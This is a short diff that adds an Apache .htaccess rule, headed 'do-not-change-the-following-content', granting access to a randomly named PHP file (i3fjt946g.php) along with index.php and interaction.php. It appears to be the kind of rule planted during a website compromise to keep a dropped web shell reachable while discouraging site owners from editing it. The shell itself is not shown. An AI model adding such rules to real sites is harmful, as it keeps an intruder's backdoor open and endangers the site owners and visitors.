@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(i3fjt946g.php|index.php|interaction.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
